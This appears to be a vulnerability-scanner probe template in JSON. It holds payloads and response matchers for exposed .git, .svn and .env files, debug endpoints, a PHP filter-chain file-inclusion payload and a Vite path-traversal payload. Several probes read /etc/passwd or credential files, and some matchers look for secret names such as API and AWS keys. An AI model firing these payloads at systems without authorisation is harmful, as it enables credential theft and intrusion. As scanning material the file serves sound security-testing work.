{
  "category": "source_code_exposure",
  "contexts": {
    "git_exposure": {
      "description": "Exposed .git directory -- download repository contents including source code, credentials, and commit history",
      "tech_match": [],
      "param_match": [],
      "probes": [
        {
          "payload": "/.git/HEAD",
          "description": "Git HEAD file -- if accessible, contains current branch ref confirming .git directory is exposed. Use git-dumper to extract full repo.",
          "matchers": [
            {
              "type": "word",
              "words": [
                "ref: refs/heads/",
                "ref: refs/"
              ]
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 70
        },
        {
          "payload": "/.git/config",
          "description": "Git config -- contains remote URL (may include credentials), author info, branch tracking. Often blocked but .git/HEAD is not.",
          "matchers": [
            {
              "type": "word",
              "words": [
                "[core]",
                "[remote",
                "repositoryformatversion"
              ],
              "condition": "or"
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 75
        }
      ]
    },
    "svn_exposure": {
      "description": "Exposed .svn directory -- download Subversion metadata including source code and credentials",
      "tech_match": [
        "Apache"
      ],
      "param_match": [],
      "probes": [
        {
          "payload": "/.svn/entries",
          "description": "SVN entries file (pre-1.7) -- contains file listing and revision info of the working copy",
          "matchers": [
            {
              "type": "word",
              "words": [
                "dir",
                "svn:"
              ]
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 65
        },
        {
          "payload": "/.svn/wc.db",
          "description": "SVN SQLite database (1.7+) -- contains full working copy metadata including file paths and checksums",
          "matchers": [
            {
              "type": "status",
              "status": [
                200
              ]
            },
            {
              "type": "word",
              "words": [
                "SQLite"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 65
        }
      ]
    },
    "env_file_exposure": {
      "description": "Exposed environment/config files -- .env, config.yml, settings files containing credentials and API keys",
      "tech_match": [],
      "param_match": [],
      "probes": [
        {
          "payload": "/.env",
          "description": ".env file -- contains environment variables (DB passwords, API keys, secret keys). Most critical file to check.",
          "matchers": [
            {
              "type": "word",
              "words": [
                "DB_PASSWORD",
                "SECRET_KEY",
                "API_KEY",
                "DATABASE_URL",
                "AWS_",
                "REDIS_"
              ],
              "condition": "or"
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 80
        },
        {
          "payload": "/.env.backup",
          "description": ".env.backup -- backup copy of .env file, often with production credentials",
          "matchers": [
            {
              "type": "word",
              "words": [
                "DB_",
                "SECRET",
                "KEY",
                "PASSWORD",
                "TOKEN"
              ],
              "condition": "or"
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 75
        }
      ]
    },
    "debug_endpoints": {
      "description": "Exposed debug/admin endpoints -- Spring Actuator, Django debug, PHP info pages leaking configuration",
      "tech_match": [
        "Spring",
        "Django",
        "PHP",
        "Laravel",
        "Rails"
      ],
      "param_match": [],
      "probes": [
        {
          "payload": "/actuator/env",
          "description": "Spring Actuator environment -- dumps all environment properties including database credentials and secrets",
          "matchers": [
            {
              "type": "word",
              "words": [
                "spring.",
                "server.port",
                "database",
                "datasource"
              ],
              "condition": "or"
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 75
        },
        {
          "payload": "/debug/vars",
          "description": "Go expvar debug endpoint -- exposes internal variables and runtime stats",
          "matchers": [
            {
              "type": "word",
              "words": [
                "memstats",
                "cmdline",
                "goroutine"
              ],
              "condition": "or"
            },
            {
              "type": "status",
              "status": [
                200
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 60
        }
      ]
    },
    "git_index_binary_magic": {
      "description": ".git/index binary file disclosed. Highest-confidence .git/ exposure marker — DIRC binary magic rules out HTML 404 returning 200.",
      "tech_match": [],
      "param_match": [],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "GET /.git/index — DIRC\\x00 magic confirms genuine git index, not HTML soft-404",
          "matchers": [
            {
              "type": "status",
              "status": [
                200
              ]
            },
            {
              "type": "regex",
              "pattern": "^DIRC\\x00\\x00\\x00[2-4]"
            }
          ],
          "severity": "high",
          "confidence_boost": 75,
          "variables": {
            "path_override": "/.git/index"
          }
        }
      ]
    },
    "php_filter_chain_lfi": {
      "description": "PHP filter chain LFI → RCE (Synacktiv). Encodes arbitrary bytes via iconv/base64 filter cascade to bypass safe-include allowlist.",
      "tech_match": [
        "php"
      ],
      "param_match": [
        "file",
        "path",
        "include",
        "page",
        "template"
      ],
      "probes": [
        {
          "payload": "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode/resource=/etc/passwd",
          "description": "Filter chain reads /etc/passwd through iconv+base64 cascade — base64 fragment confirms read",
          "matchers": [
            {
              "type": "regex",
              "pattern": "[A-Za-z0-9+/]{200,}={0,2}"
            },
            {
              "type": "length_delta",
              "min_delta": 200
            }
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {
            "manual_chain": true
          }
        }
      ]
    },
    "vite_devserver_optimized_deps_path_traversal_2026": {
      "description": "CVE-2026-39365 — Vite development server path traversal via the .map source-map handler under /node_modules/.vite/deps. Optimized-deps cache lookup accepts ../ in the requested path, escaping the cache root and reading arbitrary files (config, .env, /etc/passwd on Unix). Dev-mode only — production builds aren't affected. Surfaces when developers expose Vite dev (default :5173) to LAN or accidentally to internet.",
      "tech_match": ["vite", "vue-cli", "svelte-kit", "qwik", "astro"],
      "param_match": [],
      "probes": [
        {
          "payload": "/node_modules/.vite/deps/../../../../../etc/passwd.map",
          "description": "Linux path-trav canary via the .map handler — vulnerable Vite returns /etc/passwd as if it were a source-map.",
          "matchers": [
            {"type": "regex", "pattern": "root:x:0:0:|daemon:x:1:1:"},
            {"type": "status", "status": [200]}
          ],
          "severity": "high",
          "confidence_boost": 75,
          "variables": {"path_override": true}
        },
        {
          "payload": "/node_modules/.vite/deps/..%2F..%2F..%2F..%2F.env.map",
          "description": "URL-encoded ../ traversal pointing at a project .env. Confirms exposed Vite dev + path-trav even when raw / is filtered.",
          "matchers": [
            {"type": "regex", "pattern": "(?:DATABASE_URL|API_KEY|SECRET_KEY|JWT_SECRET|AWS_ACCESS_KEY)\\s*="},
            {"type": "status", "status": [200]}
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {"path_override": true}
        }
      ]
    }
  }
}
